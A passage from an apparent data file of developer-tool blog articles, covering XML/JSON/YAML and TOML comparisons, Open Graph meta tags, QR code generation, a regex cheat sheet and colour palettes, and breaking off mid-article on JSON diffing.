- Namespaces (critical for large enterprise systems)
- Comments that get preserved in the document
- Schema validation via XSD or DTD
- XSLT transformations directly on the data
- Signatures and encryption (XML DSig, XMLENC)

**Where XML struggles:**
- Verbosity: the closing tags double the line count
- No distinction between attributes and child elements in most use cases
- Parsing is slower and libraries are heavier
- Arrays require a wrapper element by convention (no native array type)

## JSON: The Web Standard

JSON (JavaScript Object Notation), formalized in RFC 7159 (now RFC 8259), became the default data exchange format for REST APIs around 2010. Its syntax maps directly to JavaScript objects and arrays:

\`\`\`json
{
  "name": "Alice",
  "age": 30,
  "active": true,
  "roles": ["admin", "editor"]
}
\`\`\`

**What JSON does well:**
- Native arrays — a first-class type with no wrapper required
- Tight integration with JavaScript (and every modern language)
- Compact and fast to parse
- Clear distinction between strings, numbers, and booleans
- Universally supported — every API client, database, and language handles it

**Where JSON struggles:**
- No comments — you cannot annotate a JSON file
- Strict syntax — trailing commas, single quotes, and unquoted keys all cause parse errors
- No support for binary data (must use Base64)
- No schema enforcement built in (requires JSON Schema separately)
- Verbose for config files with many similar repeated values

## YAML: The Human-Friendly Config Format

YAML (YAML Ain't Markup Language) was designed to be the most readable data format for humans. It uses indentation instead of brackets:

\`\`\`yaml
name: Alice
age: 30
active: true
roles:
  - admin
  - editor
\`\`\`

**What YAML does well:**
- No brackets, braces, or quotes required for simple strings
- Comments with \`#\`
- Multi-line strings are natural
- Perfect for configuration files that developers read and edit daily
- Supports references and anchors to avoid repetition (DRY configs)
- Widely adopted for CI/CD (GitHub Actions, GitLab CI, CircleCI)

**Where YAML struggles:**
- Indentation-sensitive: a single wrong space breaks the file
- Type inference can surprise you (Norway Problem: \`NO\` parses as boolean \`false\` in older parsers)
- Not ideal for API responses — too slow to parse and too ambiguous
- Anchors and aliases make large files hard to follow

## Direct Comparison

| Property | XML | JSON | YAML |
|----------|-----|------|------|
| First appeared | 1998 | 2001 | 2001 |
| Primary use | Enterprise data, SOAP, documents | REST APIs, data storage | Configuration files |
| Comments | Yes | No | Yes |
| Native arrays | No (via convention) | Yes | Yes |
| Schema validation | XSD, DTD | JSON Schema | No official standard |
| Binary data | Base64 | Base64 | Base64 |
| Human readability | Low | Medium | High |
| Parse speed | Slow | Fast | Medium |
| Verbosity | High | Medium | Low |
| Indentation-sensitive | No | No | Yes |

## When to Use Each

**Choose XML when:**
- Integrating with enterprise systems (SAP, Salesforce, SOAP APIs)
- You need document-like features: mixed content, namespaces, element attributes
- Your industry mandates it (healthcare HL7, finance FIX, publishing DocBook)
- You need XML signatures or encryption

**Choose JSON when:**
- Building or consuming REST APIs
- Storing document data in databases like MongoDB or PostgreSQL (JSONB)
- Sending data between a browser and a server
- You need maximum language and tooling compatibility

**Choose YAML when:**
- Writing configuration files for applications, CI/CD pipelines, or infrastructure-as-code
- Using Kubernetes, Helm, Ansible, or Docker Compose (all YAML-native)
- The file will be read and edited by humans frequently
- You want inline comments to document decisions

## Conversion Examples

The same data in all three formats:

\`\`\`xml
<server>
  <host>db.example.com</host>
  <port>5432</port>
  <ssl>true</ssl>
</server>
\`\`\`

\`\`\`json
{
  "server": {
    "host": "db.example.com",
    "port": 5432,
    "ssl": true
  }
}
\`\`\`

\`\`\`yaml
server:
  host: db.example.com
  port: 5432
  ssl: true
\`\`\`

Notice that YAML is 5 lines vs JSON's 7 vs XML's 8 for the same data. At scale, this difference adds up in both storage and readability.

## Tools for Working with All Three

| Task | Tool |
|------|------|
| Convert JSON to YAML | [JSON to YAML Converter](/json-to-yaml-converter) |
| Convert XML to JSON | [XML to JSON Converter](/xml-to-json) |
| Format and validate JSON | [JSON Formatter](/json-format) |
| Format and validate XML | [XML Formatter](/xml-format) |
| View and explore YAML | [YAML Viewer](/yaml-format) |

→ Use the [JSON to YAML Converter](/json-to-yaml-converter) to switch between formats instantly without rewriting by hand.`,
  },
  {
    slug: 'open-graph-meta-tags-guide',
    toolPath: '/og-meta-generator',
    title: 'Open Graph Meta Tags: The Complete Guide for Developers',
    description: 'Learn how to implement Open Graph and Twitter Card meta tags correctly — title, description, image specs, og:type, locale, and how to debug social previews.',
    keywords: ['open graph meta tags', 'og meta tags', 'twitter card', 'social media preview', 'og:image', 'meta tag generator'],
    category: 'Web',
    publishedAt: '2026-05-21',
    content: `## What Open Graph Actually Does

When you paste a URL into Slack, LinkedIn, Twitter, or iMessage and a preview card appears — with a title, description, and thumbnail image — that card is built from Open Graph tags. The platform fetches your page, reads specific \`<meta>\` tags in the \`<head>\`, and uses them to generate the preview.

Without Open Graph tags, platforms fall back to guessing: they might pull the first image they find, use the page's \`<title>\` tag, and grab whatever description feels most relevant. The results are unpredictable, often broken, and sometimes embarrassing for a live product.

Open Graph was created by Facebook in 2010 and is now supported by every major social platform and messaging app.

## The Essential Tags

These four tags are the minimum for any page that will be shared:

\`\`\`html
<meta property="og:title" content="How to Debug API Requests" />
<meta property="og:description" content="A systematic approach to diagnosing 4xx and 5xx errors, CORS issues, and malformed requests." />
<meta property="og:image" content="https://example.com/images/debug-api-og.png" />
<meta property="og:url" content="https://example.com/blog/how-to-debug-api-requests" />
\`\`\`

**og:title** — The headline of the card. Can differ from the page's \`<title>\` tag. Keep it under 60 characters or it gets truncated on most platforms.

**og:description** — One or two sentences describing the content. Twitter truncates after about 200 characters; LinkedIn after about 300. Be direct and informative.

**og:image** — The thumbnail. This is the most visually impactful tag. Get it right (see image specs below).

**og:url** — The canonical URL of the page. If your site has multiple URLs pointing to the same content, this tells the platform which one to use.

## Image Specifications

The og:image is where most implementations go wrong. Different platforms have different requirements, but these settings work everywhere:

| Property | Recommended value |
|----------|------------------|
| Dimensions | 1200 × 630 pixels |
| Minimum size | 600 × 315 pixels |
| Maximum file size | 8 MB (aim for under 300 KB) |
| Format | JPG or PNG (WebP has inconsistent support) |
| Aspect ratio | 1.91:1 |
| Text in image | Keep it readable at thumbnail size |

If you do not provide an og:image, most platforms either show no image or pick one at random from the page. Always provide one.

Use an absolute URL including the protocol and domain. A relative path like \`/images/og.png\` will not work.

\`\`\`html
<!-- Wrong: relative path -->
<meta property="og:image" content="/images/og-image.png" />

<!-- Correct: absolute URL -->
<meta property="og:image" content="https://mysite.com/images/og-image.png" />
\`\`\`

## Twitter Card Tags

Twitter has its own tag system alongside Open Graph. If both are present, Twitter prefers its own tags; if only Open Graph tags are present, Twitter falls back to them. For best results on Twitter, add both:

\`\`\`html
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="How to Debug API Requests" />
<meta name="twitter:description" content="A systematic approach to diagnosing 4xx errors, CORS issues, and malformed requests." />
<meta name="twitter:image" content="https://example.com/images/debug-api-og.png" />
\`\`\`

**twitter:card** — Controls the card layout. \`summary_large_image\` shows a large image above the text, which performs better for articles and product pages. \`summary\` shows a small thumbnail to the left. Use \`summary_large_image\` for content you want to drive clicks.

Twitter requires the image to be at least 300 × 157 pixels for summary_large_image. The 1200 × 630 image you create for Open Graph works here without modification.

## The og:type Tag

\`og:type\` tells platforms what kind of content the page represents. The default is \`website\`. For articles and blog posts, use \`article\`:

\`\`\`html
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2026-05-17T09:00:00Z" />
<meta property="article:author" content="https://example.com/about" />
\`\`\`

When \`og:type\` is \`article\`, Facebook and LinkedIn display the publication date and use the additional article tags. For product pages, use \`product\`. For videos, use \`video.movie\` or \`video.other\`.

## Locale and Multi-Language Pages

If your site serves multiple languages, add the locale tag and alternate locales:

\`\`\`html
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="zh_CN" />
<meta property="og:locale:alternate" content="es_ES" />
\`\`\`

The format is language code underscore region code: \`en_US\`, \`zh_CN\`, \`ja_JP\`. This helps platforms serve the right language to the right audience.

## The Site Name Tag

\`og:site_name\` adds context to the card — it shows the brand name separately from the title:

\`\`\`html
<meta property="og:site_name" content="MyUtl" />
\`\`\`

On Facebook and LinkedIn, this appears in a smaller font below or above the title, helping users recognize the source brand.

## Testing Your Tags

After adding or updating Open Graph tags, platforms cache the previous version. You need to use their official debugging tools to clear the cache and preview the new card:

| Platform | Debugging tool |
|----------|---------------|
| Facebook | developers.facebook.com/tools/debug |
| LinkedIn | linkedin.com/post-inspector |
| Twitter | cards-dev.twitter.com/validator |
| Slack | Paste URL in any channel to see live preview |

Always test on at least Facebook and Twitter before launching. Even a single broken tag can result in a blank card or placeholder image appearing on thousands of shares.

## Common Mistakes

**Missing og:url** — Without this tag, the canonical URL in social shares is unpredictable. Always set it to the clean, canonical version of the page URL.

**Using a relative image path** — The platform fetches og:image independently from outside your site. Relative paths will not resolve. Always use absolute URLs.

**Too-small images** — A 400 × 200 image will appear blurry or cropped on high-DPI screens. Always use at least 1200 × 630.

**Not refreshing the cache** — After fixing your tags, the platform still shows the old card until you use its debug tool to force a refetch.

**Same og:image for every page** — One generic image works, but per-page images with relevant visuals or text significantly improve click-through rates on shared content.

→ Use the [Meta Tag Generator](/og-meta-generator) to build a complete set of Open Graph and Twitter Card tags without memorizing the syntax.`,
  },

  // ─── New articles 2026-05 ──────────────────────────────────────
  {
    slug: 'qr-code-generator-guide',
    toolPath: '/qrcode-generator',
    title: 'QR Code Generator: Create QR Codes for URLs, Text, and WiFi',
    description: 'Learn how to generate QR codes for websites, plain text, and WiFi credentials. Covers QR code structure, error correction levels, and best practices for print and digital use.',
    keywords: ['qr code generator', 'free qr code', 'create qr code', 'qr code url', 'wifi qr code', 'qr code for website'],
    category: 'Web',
    publishedAt: '2026-05-21',
    content: `## What Is a QR Code?

A QR code (Quick Response code) is a two-dimensional barcode that encodes data as a grid of black and white squares. Originally developed by Denso Wave in 1994 for tracking automotive parts, QR codes became ubiquitous after smartphones gained built-in camera scanning. Today they appear on restaurant menus, product packaging, business cards, event tickets, and payment terminals worldwide.

Unlike a 1D barcode that stores only ~20 numeric characters, a single QR code can hold up to 4,296 alphanumeric characters or 7,089 numeric characters — enough for a full URL, a vCard contact, or a WiFi password.

## QR Code Structure Explained

### Finder Patterns
The three square patterns in the corners let scanners detect the code's position and orientation. Even if the code is rotated, skewed, or photographed at an angle, the finder patterns allow the decoder to reorient and read it correctly.

### Timing Patterns
Alternating black and white modules running between the finder patterns establish a coordinate grid. They let the decoder calculate module size and account for any distortion.

### Data Modules
The bulk of the QR code. Encoded using Reed-Solomon error correction, meaning the data is redundant — a partially damaged or obscured code can still be read.

### Quiet Zone
The blank white border surrounding the code. Without enough quiet zone, scanners may fail to detect the boundaries. Standard requirement is 4 modules of white space on all sides.

## Error Correction Levels

QR codes include built-in redundancy so they can survive physical damage, dirt, or design overlays:

| Level | Recovers from | Typical use |
|-------|--------------|-------------|
| L (Low) | ~7% damage | Clean digital displays |
| M (Medium) | ~15% damage | Most general uses |
| Q (Quartile) | ~25% damage | Industrial environments |
| H (High) | ~30% damage | Logo overlay, printed materials |

Higher error correction increases the code's density (more modules = larger or denser code). For most URLs, **M level** offers a good balance between scan reliability and code size.

## What Data Can a QR Code Store?

### URLs
The most common use case. Encode any HTTPS URL. Keep URLs short — shorter URLs produce less dense codes that scan more reliably at small sizes.

\`\`\`
https://myutl.com/json-format
\`\`\`

### Plain Text
Encode instructions, addresses, or notes that don't require internet access to read.

### WiFi Credentials
A special format lets phones join a network without typing a password:

\`\`\`
WIFI:T:WPA;S:MyNetworkName;P:MyPassword;;
\`\`\`

Scan this with iOS 11+ or Android 10+ to connect instantly. No app needed.

### Contact Information (vCard)
A standardized vCard QR code lets people add your contact details with one scan:

\`\`\`
BEGIN:VCARD
VERSION:3.0
N:Smith;John;;;
FN:John Smith
ORG:Acme Inc.
TEL:+1-555-0100
EMAIL:john@example.com
END:VCARD
\`\`\`

### Email and SMS
Pre-fill an email or SMS for easy one-tap actions:

\`\`\`
mailto:support@example.com?subject=Help%20Request
sms:+15550100?body=Hello
\`\`\`

## Best Practices for Print

**Minimum size**: 2 cm × 2 cm for codes scanned from arm's length. Larger for billboards or codes scanned from greater distances.

**Color contrast**: Dark modules on a light background. Avoid low-contrast color combinations. The scanner looks for a 4:1 contrast ratio minimum.

**Testing before printing**: Print a test copy at actual size and scan it with multiple devices before sending to the printer.

**Avoid placing text inside the quiet zone**: Surrounding text must not intrude on the 4-module border.

**Use H-level error correction with logos**: If you embed a logo or icon over the center of the QR code, the logo covers some modules. High error correction compensates.

## Best Practices for Digital Use

On screens, QR codes are typically shown for people to scan with their phone. Considerations differ from print:

- Brightness and glare from the display can make scanning difficult — provide adequate contrast settings
- Animation or transitions behind the code interfere with scanning; keep the background static
- On small phone screens, show QR codes at full width or provide a "save image" option

## QR Code vs Barcode: When to Use Which

| Feature | QR Code | 1D Barcode |
|---------|---------|-----------|
| Data capacity | Up to 4,296 chars | ~20 chars |
| Scan direction | Any angle | Must align |
| Damage tolerance | Yes (error correction) | No |
| Common uses | URLs, payments, menus | Retail products, logistics |
| Requires app | No (modern phones) | Sometimes |

Use a standard 1D barcode for retail products where scanner infrastructure already expects it. Use QR codes for everything else — especially consumer-facing content where the user brings their own phone.

## Generate QR Codes Instantly

→ Use the [QR Code Generator](/qrcode-generator) to create a QR code for any URL or text, with customizable foreground and background colors.

→ For WiFi networks specifically, the [WiFi QR Code Generator](/wifi-qrcode-generator) creates properly formatted WiFi QR codes that work with iOS and Android native camera apps.`,
  },
  {
    slug: 'regex-cheat-sheet-guide',
    toolPath: '/regex-memo',
    title: 'Regex Cheat Sheet: Every Regular Expression Pattern You Actually Need',
    description: 'A practical reference for regular expressions — anchors, quantifiers, character classes, lookaheads, and real-world patterns for emails, URLs, IPs, and dates.',
    keywords: ['regex cheat sheet', 'regular expressions examples', 'regex patterns', 'regex tutorial', 'regular expression syntax', 'regex reference'],
    category: 'Development',
    publishedAt: '2026-05-21',
    content: `## Regular Expressions at a Glance

A regular expression (regex) is a sequence of characters that defines a search pattern. The same syntax works across JavaScript, Python, Go, Java, PHP, Ruby, and most modern languages — with minor dialect differences.

Learning regex once gives you a tool that works everywhere: in your editor's find-and-replace, command-line tools like \`grep\` and \`sed\`, log analysis pipelines, form validation, and data extraction scripts.

## Anchors

Anchors don't match characters — they match positions.

| Pattern | Matches |
|---------|---------|
| \`^\` | Start of string (or line in multiline mode) |
| \`$\` | End of string (or line in multiline mode) |
| \`\\b\` | Word boundary (between \\w and \\W) |
| \`\\B\` | Non-word boundary |

\`\`\`regex
^hello        matches "hello world" but not "say hello"
world$        matches "hello world" but not "worldwide"
\\bcat\\b      matches "cat" but not "concatenate"
\`\`\`

## Character Classes

| Pattern | Matches |
|---------|---------|
| \`.\` | Any character except newline |
| \`\\d\` | Digit: \`[0-9]\` |
| \`\\D\` | Non-digit: \`[^0-9]\` |
| \`\\w\` | Word char: \`[a-zA-Z0-9_]\` |
| \`\\W\` | Non-word char |
| \`\\s\` | Whitespace: space, tab, newline |
| \`\\S\` | Non-whitespace |
| \`[abc]\` | a, b, or c |
| \`[^abc]\` | Anything except a, b, or c |
| \`[a-z]\` | Any lowercase letter |
| \`[A-Za-z0-9]\` | Alphanumeric |

## Quantifiers

| Pattern | Meaning |
|---------|---------|
| \`*\` | 0 or more |
| \`+\` | 1 or more |
| \`?\` | 0 or 1 (optional) |
| \`{n}\` | Exactly n times |
| \`{n,}\` | n or more times |
| \`{n,m}\` | Between n and m times |
| \`*?\` | 0 or more, lazy (non-greedy) |
| \`+?\` | 1 or more, lazy |

**Greedy vs lazy**: By default, quantifiers are greedy — they match as much as possible. Adding \`?\` makes them lazy — they match as little as possible.

\`\`\`regex
Input: <b>bold</b> and <i>italic</i>

Greedy  <.*>   matches entire string
Lazy    <.*?>  matches <b>, </b>, <i>, </i> separately
\`\`\`

## Groups and Alternation

| Pattern | Meaning |
|---------|---------|
| \`(abc)\` | Capturing group |
| \`(?:abc)\` | Non-capturing group |
| \`(?<name>abc)\` | Named capturing group |
| \`a\|b\` | Alternation: a or b |
| \`\\1\` | Backreference to group 1 |

Named groups make complex patterns readable:

\`\`\`regex
(?<year>\\d{4})-(?<month>\\d{2})-(?<day>\\d{2})
\`\`\`

Matches \`2026-05-21\` and lets you access \`match.groups.year\`, \`match.groups.month\`, \`match.groups.day\`.

## Lookaheads and Lookbehinds

These assert what comes before or after a position without including it in the match:

| Pattern | Meaning |
|---------|---------|
| \`(?=abc)\` | Positive lookahead: followed by abc |
| \`(?!abc)\` | Negative lookahead: NOT followed by abc |
| \`(?<=abc)\` | Positive lookbehind: preceded by abc |
| \`(?<!abc)\` | Negative lookbehind: NOT preceded by abc |

\`\`\`regex
\\d+(?= dollars)   matches "100" in "100 dollars" but not "100 euros"
(?<=\\$)\\d+        matches digits after a dollar sign
\`\`\`

## Flags

| Flag | Effect |
|------|--------|
| \`g\` | Global — find all matches, not just first |
| \`i\` | Case-insensitive |
| \`m\` | Multiline — ^ and $ match line boundaries |
| \`s\` | Dotall — dot matches newline too |
| \`u\` | Unicode mode |

## Real-World Patterns

### Email Address (practical)
\`\`\`regex
^[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$
\`\`\`
Covers the vast majority of real email addresses. Note: the full RFC 5321 spec allows characters most real-world emails never use. This pattern rejects edge cases intentionally.

### URL
\`\`\`regex
https?://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,}(/[\\w\\-\\./\\?\\=\\&\\#\\%]*)?
\`\`\`

### IPv4 Address
\`\`\`regex
^((25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.){3}(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)$
\`\`\`
Validates each octet is 0–255, rejecting \`999.0.0.1\`.

### ISO Date (YYYY-MM-DD)
\`\`\`regex
^\\d{4}-(0[1-9]|1[0-2])-(0[1-9]|[12]\\d|3[01])$
\`\`\`

### Hex Color Code
\`\`\`regex
^#([a-fA-F0-9]{6}|[a-fA-F0-9]{3})$
\`\`\`

### Credit Card Number (basic format check)
\`\`\`regex
^(?:4\\d{12}(?:\\d{3})?|5[1-5]\\d{14}|3[47]\\d{13}|6(?:011|5\\d{2})\\d{12})$
\`\`\`
Matches Visa, Mastercard, Amex, Discover formats. Does not validate using Luhn algorithm.

### Password (min 8 chars, requires letter + digit)
\`\`\`regex
^(?=.*[A-Za-z])(?=.*\\d)[A-Za-z\\d@$!%*#?&]{8,}$
\`\`\`

### Slug (URL-safe string)
\`\`\`regex
^[a-z0-9]+(?:-[a-z0-9]+)*$
\`\`\`

## Common Mistakes

**Forgetting to escape dots**: In regex, \`.\` matches any character. To match a literal period, write \`\\.\`. The pattern \`myfile.txt\` matches \`myfileXtxt\` — usually not what you want.

**Catastrophic backtracking**: Nested quantifiers like \`(a+)+\` can cause exponential time on certain inputs. Avoid patterns where multiple quantifiers can match the same characters.

**Not anchoring validation patterns**: Without \`^\` and \`$\`, a pattern like \`\\d{4}\` matches the four-digit substring anywhere in the input — it won't reject \`abc1234def\`.

**Using greedy match when lazy is needed**: When extracting content between tags, greedy \`<.*>\` grabs everything from first open to last close tag. Use \`<.*?>\` instead.

## Testing Your Patterns

→ Use the [Regex Tester](/regex-tester) to write and test patterns with live highlighting, capture group inspection, and match details.

→ The [Regex Cheat Sheet](/regex-memo) provides a quick-reference card for the most common patterns, all in one scrollable view.`,
  },
  {
    slug: 'toml-yaml-json-config-comparison',
    toolPath: '/toml-to-json',
    title: 'TOML vs YAML vs JSON for Config Files: A Practical Comparison',
    description: 'Compare TOML, YAML, and JSON as configuration file formats. Covers syntax, readability, tooling support, and which to choose for different projects.',
    keywords: ['toml vs yaml', 'toml vs json', 'yaml vs json config', 'best config file format', 'toml configuration', 'yaml configuration'],
    category: 'Data',
    publishedAt: '2026-05-21',
    content: `## Why Config File Format Matters

Configuration files are the interface between your software and the humans who operate it. A poor format choice creates friction: obscure syntax errors, unexpected type coercions, poor diffs in version control, and steep learning curves for new team members. The three dominant text-based config formats each solve the problem differently.

## JSON

JSON (JavaScript Object Notation) was designed for data interchange, not human-authored config files. It was later adopted as a config format because of its ubiquity and strict parsing rules.

\`\`\`json
{
  "server": {
    "host": "0.0.0.0",
    "port": 8080,
    "timeout": 30
  },
  "database": {
    "url": "postgres://localhost/myapp",
    "pool_size": 10
  }
}
\`\`\`

**Strengths:**
- Universal tooling support — every language has a JSON parser
- Strict and unambiguous: no type guessing, no implicit conversions
- Great for machine-generated config (Prettier, ESLint, package.json)
- Excellent diff readability in version control

**Weaknesses:**
- No comments — a significant pain point for config files
- Verbose syntax (quotes on every key, commas, brackets)
- No multi-line strings without awkward escaping
- Trailing commas are a syntax error (though JSONC fixes this)

**Best for**: npm/package.json, VS Code settings, language tooling configs, APIs where the consumer is code rather than a person.

## YAML

YAML (YAML Ain't Markup Language) was purpose-built for human-readable config. It prioritizes minimal punctuation and natural expression.

\`\`\`yaml
server:
  host: 0.0.0.0
  port: 8080
  timeout: 30

database:
  url: postgres://localhost/myapp
  pool_size: 10

# Comments work natively
feature_flags:
  new_dashboard: true
  beta_api: false
\`\`\`

**Strengths:**
- Comments supported natively
- Minimal punctuation — no quotes required for most strings
- Multi-line strings with \`|\` (literal) and \`>\` (folded)
- Anchors and aliases for DRY configs
- Widely used in DevOps (Docker Compose, Kubernetes, GitHub Actions, Ansible)

**Weaknesses:**
- Indentation-sensitive: a stray space breaks the file
- Type inference can surprise you: \`port: 8080\` is an integer, but \`version: 1.10\` may be parsed as \`1.1\`
- Norwegian developer problem: \`no\` is parsed as boolean \`false\` in YAML 1.1
- Complex features (merge keys, multiple documents) add cognitive load

**Best for**: Docker Compose, Kubernetes manifests, CI/CD pipelines (GitHub Actions, GitLab CI), Ansible playbooks, Hugo/Jekyll static sites.

## TOML

TOML (Tom's Obvious Minimal Language) was created in 2013 by Tom Preston-Werner (GitHub co-founder) specifically to be a config format that is unambiguous, readable, and predictable.

\`\`\`toml
[server]
host = "0.0.0.0"
port = 8080
timeout = 30

[database]
url = "postgres://localhost/myapp"
pool_size = 10

# Comments work natively
[feature_flags]
new_dashboard = true
beta_api = false
\`\`\`

**Strengths:**
- Explicit types: strings require quotes, numbers don't, booleans are \`true\`/\`false\`
- No indentation-sensitivity: structure is defined by \`[section]\` headers
- Comments supported
- First-class date/time types: \`2026-05-21\`, \`2026-05-21T09:00:00Z\`
- Unambiguous: no surprise type coercions

**Weaknesses:**
- Less tooling support than JSON or YAML (improving rapidly)
- Arrays of tables have unintuitive syntax
- Not suitable for deeply nested structures
- Less familiar to developers who haven't used Rust or Cargo

**Best for**: Rust projects (Cargo.toml), Hugo configurations, Python tools (pyproject.toml, poetry), any project that prioritizes config file correctness over ecosystem convention.

## Side-by-Side Comparison

| Feature | JSON | YAML | TOML |
|---------|------|------|------|
| Comments | ❌ | ✅ | ✅ |
| Indentation-sensitive | ❌ | ✅ | ❌ |
| Multi-line strings | Awkward | ✅ | ✅ |
| Strict types | ✅ | ❌ | ✅ |
| Arrays | ✅ | ✅ | Verbose |
| Dates/times | ❌ | ❌ | ✅ |
| Universal tooling | ✅ | ✅ | Growing |
| DevOps ecosystem | Low | High | Medium |

## Which Should You Choose?

**Choose JSON when:**
- The file is written by tools, not humans (package.json, .eslintrc)
- Strict schema validation is a priority
- You need maximum language/tooling compatibility

**Choose YAML when:**
- You're working in the Kubernetes, Docker, or GitHub Actions ecosystem
- Your team already uses YAML and consistency matters
- You need inline comments for documentation

**Choose TOML when:**
- You're building a Rust project (Cargo.toml is standard)
- You want predictable type parsing without surprises
- Your config has many settings that benefit from section headers

## Converting Between Formats

If you inherited a project using one format and want to migrate to another:

→ [TOML to JSON](/toml-to-json) — Convert TOML configuration to JSON
→ [TOML to YAML](/toml-to-yaml) — Convert TOML to YAML
→ [YAML to JSON converter](/yaml-to-json-converter) — Convert YAML to JSON
→ [YAML to TOML](/yaml-to-toml) — Convert YAML to TOML
→ [JSON to TOML](/json-to-toml) — Convert JSON to TOML`,
  },
  {
    slug: 'color-palette-generator-guide',
    toolPath: '/color-palette-generator',
    title: 'Color Palette Generator: Build Harmonious Color Schemes for UI Design',
    description: 'Learn how to generate color palettes, tints, shades, and color harmonies. Covers color theory basics, accessible contrast, and practical tips for applying palettes in CSS.',
    keywords: ['color palette generator', 'color scheme generator', 'complementary colors', 'color harmonies', 'tints and shades', 'accessible color palette', 'ui color palette'],
    category: 'Web',
    publishedAt: '2026-05-21',
    content: `## Why Color Palettes Matter in UI Design

A well-chosen color palette does three things simultaneously: it establishes visual hierarchy (directing the eye to what matters), communicates personality and brand, and meets accessibility standards so the interface is usable for everyone, including people with color vision deficiencies.

Choosing colors by feel — clicking around a color picker until something looks right — rarely produces a palette that works across all these dimensions. Color theory gives you a systematic approach: start with one anchor color and derive the rest using geometric relationships on the color wheel.

## Color Theory Fundamentals

### The Color Wheel
The modern color wheel arranges hues in a circle based on their perceptual relationships. Adjacent colors feel harmonious; opposite colors create contrast. The wheel is the foundation of every color harmony system.

### Hue, Saturation, and Lightness (HSL)
HSL is more intuitive for design work than RGB:
- **Hue**: Position on the color wheel, 0–360°
- **Saturation**: Intensity, 0% (gray) to 100% (vivid)
- **Lightness**: Brightness, 0% (black) to 100% (white)

To create a tint (lighter version), increase lightness. To create a shade (darker version), decrease lightness. To desaturate for a background, reduce saturation. All while keeping the same hue.

## Color Harmony Schemes

### Monochromatic
One hue across a range of lightness and saturation values. Creates cohesion and sophistication. Safe choice for minimalist designs.

\`\`\`
Base: hsl(220, 80%, 50%)
Light tint: hsl(220, 80%, 90%)
Mid shade: hsl(220, 80%, 35%)
Dark shade: hsl(220, 80%, 20%)
\`\`\`

### Complementary
Two colors directly opposite on the color wheel (180° apart). High contrast — good for call-to-action buttons against backgrounds. Use one color as dominant, the other as accent.

\`\`\`
Blue hsl(220, 80%, 50%) + Orange hsl(40, 80%, 50%)
\`\`\`

### Split Complementary
One base color plus the two colors adjacent to its complement. More nuanced than complementary — high contrast but less visually aggressive.

### Analogous
Three or more colors adjacent on the color wheel (within ~30–60°). Creates harmony and a natural feel. Common in nature-inspired designs.

### Triadic
Three colors evenly spaced (120° apart). Vibrant and balanced. Requires careful management — usually one dominant, one secondary, one accent.

### Tetradic (Square)
Four colors at 90° intervals. Rich palette but challenging to balance. Limit saturated versions to accents only.

## Tints, Shades, and Tones

A single hue produces a full range of usable colors:

- **Tint**: Add white (increase lightness). Use for backgrounds, hover states.
- **Shade**: Add black (decrease lightness). Use for text, borders, shadows.
- **Tone**: Add gray (reduce saturation). Use for muted UI elements.

A practical scale for a UI palette:

| Step | Lightness | Use case |
|------|-----------|----------|
| 50 | 95% | Page background |
| 100 | 90% | Card background |
| 200 | 80% | Subtle border |
| 300 | 70% | Disabled state |
| 400 | 60% | Placeholder text |
| 500 | 50% | Primary color |
| 600 | 40% | Hover state |
| 700 | 30% | Active state |
| 800 | 20% | Heading text |
| 900 | 10% | Body text |

This approach mirrors design systems like Tailwind CSS, Material Design, and Radix UI Colors.

## Accessibility: Contrast Ratios

WCAG 2.1 accessibility guidelines require minimum contrast between text and background:

- **AA level**: 4.5:1 for normal text, 3:1 for large text (18pt+)
- **AAA level**: 7:1 for normal text, 4.5:1 for large text

Common failure patterns:
- Light gray text on white background (often fails at #999 on white)
- Colored text on colored backgrounds with similar lightness
- Icon-only buttons without sufficient contrast

A quick rule: if both text and background have similar lightness values (both light or both dark), contrast will be insufficient. Aim for a lightness difference of at least 40–50 percentage points.

## Applying a Palette in CSS

Once you have your palette, define it as CSS custom properties at the \`:root\` level:

\`\`\`css
:root {
  --color-primary-50:  hsl(220, 80%, 95%);
  --color-primary-100: hsl(220, 80%, 90%);
  --color-primary-500: hsl(220, 80%, 50%);
  --color-primary-600: hsl(220, 80%, 40%);
  --color-primary-900: hsl(220, 80%, 10%);

  --color-accent-500:  hsl(40, 80%, 50%);

  --color-neutral-100: hsl(220, 10%, 95%);
  --color-neutral-900: hsl(220, 10%, 10%);
}
\`\`\`

Reference these variables throughout your stylesheets. When you adjust the palette, change one value and it updates everywhere.

## Dark Mode Color Palettes

Dark mode isn't simply inverting your light palette. Pure black (#000000) backgrounds create harsh contrast with white text. Instead:

- Use dark grays (hsl(220, 10%, 8–12%)) for backgrounds
- Keep primary accent colors at the same hue but adjust saturation (+10%) and lightness (+10%) to compensate for the Helmholtz–Kohlrausch effect (saturated colors appear brighter on dark backgrounds)
- Background elevations use subtle lightness increments (10%, 12%, 15%) rather than shadows

## Generate Your Palette

→ Use the [Color Palette Generator](/color-palette-generator) to generate tints, shades, and complementary colors from any base color. Export values in HEX, RGB, or HSL.

→ The [Color Converter](/color-converter) converts between HEX, RGB, and HSL so you can use your palette values in any format your codebase requires.`,
  },
  {
    slug: 'json-diff-checker-guide',
    toolPath: '/json-diff',
    title: 'JSON Diff: How to Compare Two JSON Objects and Find What Changed',
    description: 'Learn how to compare JSON objects online to find added, removed, and changed keys. Covers common use cases like API response comparison, config drift detection, and debugging.',
    keywords: ['json diff', 'compare json', 'json diff checker', 'json comparison tool', 'json diff online', 'find differences json'],
    category: 'Development',
    publishedAt: '2026-05-21',
    content: `## What Is a JSON Diff?

A JSON diff is a comparison between two JSON objects that identifies every key that was added, removed, or had its value changed. Unlike a text diff (which compares raw lines), a JSON diff understands structure: it matches objects by key, arrays by position (or by a key field), and reports changes at the semantic level rather than the character level.

This makes JSON diff far more useful for developers than piping two JSON files into \`diff\`. A text diff would show the entire object as changed if you simply reformatted the indentation. A JSON diff ignores formatting and focuses on the data.

## Why Developers Need JSON Diff

### Debugging API Changes
You made a change to a backend endpoint and need to confirm the response structure is exactly what the frontend expects. Compare the before and after responses to see what changed.

### Detecting Configuration Drift
Two environments (staging and production) should have identical configs, but something went wrong. A JSON diff instantly reveals which keys diverged and by how much.

### Code Review
A pull request changes a JSON schema, a fixture file, or a package-lock.json. A semantic diff shows meaningful changes without noise from reformatting.

### Regression Testing
